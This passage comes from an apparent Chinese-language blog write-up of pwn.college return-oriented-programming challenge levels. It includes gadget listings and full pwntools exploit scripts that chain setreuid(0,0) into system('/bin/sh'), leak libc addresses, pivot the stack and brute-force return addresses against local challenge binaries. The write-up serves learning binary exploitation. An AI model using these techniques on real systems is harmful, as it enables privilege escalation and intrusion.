class="hljs-number">1000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vsyscall]</span><br></code></pre></td></tr></table></figure>
+
+<p>查看gadget：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rax&quot;</span><br>0x0000000000401bc7 : pop rax ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdx&quot;</span><br>0x0000000000401bef : pop rdx ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdi&quot;</span><br>0x0000000000401bd7 : pop rdi ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rsi&quot;</span><br>0x0000000000401d61 : pop rsi ; pop r15 ; ret<br>0x0000000000401bcf : pop rsi ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;syscall&quot;</span><br>Gadgets information<br>============================================================<br>0x0000000000401bdf : syscall<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h4><p>没有syscall gadget了。但是在IDA中看到了以下函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">force_import</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">off_t</span> *v2; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rcx</span><br><br>  open(a1, a2);<br>  <span class="hljs-keyword">return</span> sendfile((<span class="hljs-type">int</span>)a1, a2, v2, v3);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>sendfile这个可太熟了，第一个shellcode就是sendfile。直接调用这个函数就行了。查看gadget：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000004014d2</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbx</span> <span class="hljs-comment">; pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-number">0x00000000004023d4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rcx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000004023cc</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000004023dc</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0000000000402621</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span> <span class="hljs-comment">; pop r15 ; ret</span><br><span class="hljs-number">0x00000000004023c4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span> <span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure>
+
+<p>force_import的地址：<code>0x402399</code>。这里复习一下<code>x86-64</code>架构的<code>System V AMD64 ABI</code>调用约定下，<strong>整数和指针</strong>参数传递规则</p>
+<table>
+<thead>
+<tr>
+<th>参数顺序</th>
+<th>寄存器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第1个</td>
+<td><code>rdi</code></td>
+</tr>
+<tr>
+<td>第2个</td>
+<td><code>rsi</code></td>
+</tr>
+<tr>
+<td>第3个</td>
+<td><code>rdx</code></td>
+</tr>
+<tr>
+<td>第4个</td>
+<td><code>rcx</code></td>
+</tr>
+<tr>
+<td>第5个</td>
+<td><code>r8</code></td>
+</tr>
+<tr>
+<td>第6个</td>
+<td><code>r9</code></td>
+</tr>
+<tr>
+<td>第7个及以后</td>
+<td>栈</td>
+</tr>
+</tbody></table>
+<p>当掌握了返回地址时，可以跳跃到任何地方。包括一个函数的中间某条指令处。只要某个段有可执行权限，那么就可以将返回地址设置为它，并执行其中的代码。这里用到了<code>.plt.sec</code>段的read函数。然后使其接收用户输入来将”&#x2F;flag”字符串写入一个可写段。再调用force_import。</p>
+<p>这里需要调用两次force_import，且第一次应该是函数的起始地址，因为我们需要正常返回，需要主要函数调用时栈的迁移。如果我们设置的ret地址是调用open时的地址，那么在执行完sendfile后，无法正常返回。因为返回地址没有push进栈，导致返回不了。第二次时，可以不执行open，执行open的话会导致我们设置的ROP失效，因为open函数调用后会导致一些寄存器的值被修改，导致sendfile失败。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level6.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span><br><span class="hljs-comment"># p.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)</span><br><span class="hljs-comment"># buf_addr = p.recv(14)</span><br><span class="hljs-comment"># print(&quot;buf_addr:&quot;, buf_addr)</span><br><span class="hljs-comment"># buf_addr = p64(int(buf_addr.decode(&#x27;utf-8&#x27;)[2:], 16))</span><br>buf_addr = p64(<span class="hljs-number">0x405000</span>)<br>pop_rdi = p64(<span class="hljs-number">0x00000000004023cc</span>)<br>pop_rsi = p64(<span class="hljs-number">0x00000000004023c4</span>)<br>pop_rax = p64(<span class="hljs-number">0x0000000000401bc7</span>)<br>pop_rcx = p64(<span class="hljs-number">0x00000000004023d4</span>)<br><span class="hljs-comment"># syscall = p64(0x0000000000401bdf)</span><br>pop_rdx = p64(<span class="hljs-number">0x00000000004023dc</span>)<br><span class="hljs-comment"># open_sys = pop_rdi + buf_addr + pop_rsi + p64(0x0) + pop_rax + p64(0x2) + syscall</span><br><span class="hljs-comment"># read_sys = pop_rax + p64(0x0) + pop_rdi + p64(0x3) + pop_rsi + buf_addr + pop_rdx + p64(1024) + syscall</span><br><span class="hljs-comment"># write_sys = pop_rdx + p64(0x39) + pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + buf_addr + syscall</span><br><span class="hljs-comment"># read_stdin = pop_rax + p64(0x0) + pop_rdi + p64(0) + pop_rsi + buf_addr + pop_rdx + p64(0x6) + syscall</span><br>read_stdin = pop_rdi + p64(<span class="hljs-number">0x0</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">0x6</span>) + p64(<span class="hljs-number">0x401160</span>)<br>force_import_open = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0x0</span>) + pop_rdx + p64(<span class="hljs-number">0x0</span>) + pop_rcx + p64(<span class="hljs-number">0x39</span>) + p64(<span class="hljs-number">0x402399</span>)<br>force_import_send = pop_rdi + p64(<span class="hljs-number">0x1</span>) + pop_rsi + p64(<span class="hljs-number">0x3</span>) + pop_rdx + p64(<span class="hljs-number">0x0</span>) + pop_rcx + p64(<span class="hljs-number">0x39</span>) + p64(<span class="hljs-number">0x4023ab</span>)<br>payload = padding + read_stdin + force_import_open + force_import_send<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + p8(<span class="hljs-number">0x00</span>))<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h4><p>这道题就是上面的exp改地址就行了。</p>
+<h4 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h4><p>这里有一个坑啊，就是直接使用<code>system(&quot;/bin/sh&quot;)</code>，拿到shell后，还是”hacker”的身份，依然没有权限拿到flag。需要做一个进程uid的修改。</p>
+<blockquote>
+<p>UID（用户标识符）</p>
+<p>UID是用于标识系统中每个用户的唯一数字。每个用户都有一个UID，系统通过UID来识别用户并控制其权限。普通用户的UID从1000开始，具体取决于系统的配置。ROOT用户的UID始终为0。</p>
+<p>Real UID和 Effective UID</p>
+<p>真实用户ID是启动进程的用户的UID。它代表了进程的真正所有者。</p>
+<p>有效用户ID决定了进程在执行操作时的权限级别。有些时候进程需要特权时便会切换EUID以执行相应操作。</p>
+<p>但是，RUID为普通用户，启动的shell也是普通用户。【也有例外】如果可执行文件设置了Set UID位，并且其所有者是Root，那么无论谁允许该程序，进程的有效用户ID都会是Root。</p>
+<p><code>setreuid</code>是一个系统调用，用户改变进程的真实用户ID和有效用户ID。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setreuid</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> ruid, <span class="hljs-type">uid_t</span> euid)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ruid: 要设置的真实用户ID。如果传入-1，则表示不改变当前的ruid。0表示root</span><br><span class="hljs-comment">euid: 要设置的有效用户ID。如果传入-1，则表示不改变当前的euid。0表示root</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></blockquote>
+<p>这一个level我尝试了chmod，但是发现不行。chmod+ln -s的方式。修改&#x2F;flag的软链接文件的权限，但是是失败的，我在Practice模式里尝试也是失败的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level7.0&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The address of \&quot;system\&quot; in libc is: &quot;</span>)<br>sys_addr = p.recv(<span class="hljs-number">14</span>)<br>sys_addr = <span class="hljs-built_in">int</span>(sys_addr.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sys_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(sys_addr))<br>libc.address = sys_addr - libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump)<br><br>payload = padding + rop.chain()<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br><span class="hljs-comment"># print(p.recvall())</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h4><p>只改padding即可。</p>
+<h4 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h4><p>看了一下课才知道怎么做。思路是：由于延迟绑定的原因，只有先执行一遍libc中的函数，libc.so才会被加载进内存，此时我们获得的libc的基址就是内存中实际libc的地址。因此，可以采用<code>puts(puts)</code>的形式，像题目中提示的那样。</p>
+<p>首先执行一次<code>plt.put(got.puts)</code>，这样能够把got表中puts的值打印出来。然后再用puts的got表地址减去puts在libc中的偏移地址得到libc的基地址。此时，我们再返回challenge函数重新执行一遍challenge。第二次challenge的执行是为了获得shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level8.0&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x78</span><br>challenge_addr = p64(<span class="hljs-number">0x402000</span>)  <span class="hljs-comment"># 这里可以直接换成read指令所在的地址，因为我们没有修改rbp</span><br>e = p.elf<br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(challenge_addr)<br>payload = padding + r.chain()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_got_addr))<br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br>payload = padding + rop.chain()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h4><p>改一下padding以及challenge的地址就行</p>
+<h4 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h4><p>有点小麻，由于长时间尝试返回地址为challenge，导致栈迁移后大概率会出现问题。因为进入challenge时会创建新的函数栈帧，而这个栈帧会导致后面的printf函数出现空指针的错误，因此，我一直在尝试解决这个问题，修复栈修复到我要原地爆炸！最后还是妥协，返回地址设置成read函数那儿，从而一下就能出来，因为栈没有变，迁移后的栈是我们可控的。</p>
+<p>buf_addr: <code>0x4150e0</code>，需要用leave指令把栈迁移到bss段的可写段。我开辟了一个rsp-&gt;<code>0x4150f8</code>然后rbp-&gt;<code>0x415140</code>这么样的一个新栈帧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level9.0&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-comment"># padding = b&#x27;a&#x27;*0x48</span><br>read_addr = p64(<span class="hljs-number">0x402257</span>)  <br>e = p.elf<br>r = ROP(e)<br><span class="hljs-comment"># buf_addr = 0x415100</span><br>r.raw(r.rbp)<br>r.raw(<span class="hljs-number">0x4150f8</span>)<br>r.raw(r.leave)<br>r.raw(<span class="hljs-number">0x415140</span>)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(read_addr)<br>payload = r.chain()<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br><span class="hljs-comment"># printf_got_addr = p.recv(6)</span><br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_got_addr))<br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-comment"># p.send(payload)</span><br><span class="hljs-comment"># libc.address = sys_addr - libc.symbols[&#x27;system&#x27;]</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">56</span><br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + rop.chain()<br>pause()<br>p.send(payload)<br><br><span class="hljs-comment"># print(p.recvall())</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h4><p>只用改buf的地址以及read的地址即可。</p>
+<h4 id="level10-0"><a href="#level10-0" class="headerlink" title="level10.0"></a>level10.0</h4><p>这题依然是栈迁移，需要细细分析。leave指令的作用。并且需要查看win函数地址存放在栈的哪里。</p>
+<blockquote>
+<p><code>leave = mov rbp, rsp; pop rbp;</code></p>
+</blockquote>
+<p>基于leave指令的特性，可以覆盖rbp的值，使其在栈中迁移。因为challenge函数在ret前会有一次leave。所以可以迁移rbp指令至win函数地址-8的位置。为什么要减去8？分析stack(win) - 8（这表示win函数地址的栈地址并减去8）的情形：</p>
+<p>当修改rbp地址的存储为stack(win)-8后，正常执行结束challenge函数，那么会执行一次leave指令。先执行<code>mov rsp, rbp</code>后：rsp此时指向stack(win)-8，再执行&#96;&#96;pop rbp&#96;后，rbp此时的地址为stack(win)-8，此时rsp指向原先rbp的地址+8，即返回地址处。</p>
+<p>那么再执行一次leave后，还会执行<code>mov rsp, rbp</code>，此时rsp的地址为stack(win)-8。此时再执行<code>pop rbp</code>后，rbp可能已经丢失了，然后rsp为stack(win)。那么此时再执行一个ret指令，即跳转到win函数了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&quot;/challenge/babyrop_level10.0&quot;</span>)<br>    padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: &#x27;</span>)<br>    input_buf = p64(<span class="hljs-built_in">int</span>(p.recvline().strip()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>)<br><br>    payload = padding + input_buf + p16(<span class="hljs-number">0xe71e</span>)<br>    <span class="hljs-comment"># pause()</span><br>    p.send(payload)<br>    out = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(out)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>当然，因为题目给了win函数的地址，因此可以直接ret到那儿去。但是10.1还是要按照这种方法做的。</p>
+<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h4><p>该padding以及gadget偏移即可。</p>
+<h4 id="level11-0"><a href="#level11-0" class="headerlink" title="level11.0"></a>level11.0</h4><p>如level10.1脚本，改gadget偏移</p>
+<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h4><p>还是改gadget偏移即可</p>
+<h4 id="level12-0"><a href="#level12-0" class="headerlink" title="level12.0"></a>level12.0</h4><p>这题没有challenge函数了。因此，我们爆破的是main函数的返回地址。它会去到libc.so文件中。所以我们需要拿到libc.so文件中的<code>leave;ret</code>指令的偏移地址。然后爆破。这里爆破的时间就有点长了，因为偏移地址是3个字节的长度。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">from</span> pwn import *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-keyword">while</span> True:<br>    p = process(<span class="hljs-string">&quot;/challenge/babyrop_level12.1&quot;</span>)<br>    padding = b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span><br>    p.recvuntil(b<span class="hljs-string">&#x27;located at: &#x27;</span>)<br>    input_buf = p64(<span class="hljs-built_in">int</span>(p.recvline().strip()[:<span class="hljs-number">-1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>)<br>    payload = padding + input_buf + p16(<span class="hljs-number">0x18c8</span>) + p8(<span class="hljs-number">0x73</span>)<br>    <span class="hljs-meta"># pause()</span><br>    p.send(payload)<br>    <span class="hljs-keyword">out</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">out</span>:<br>        <span class="hljs-function"><span 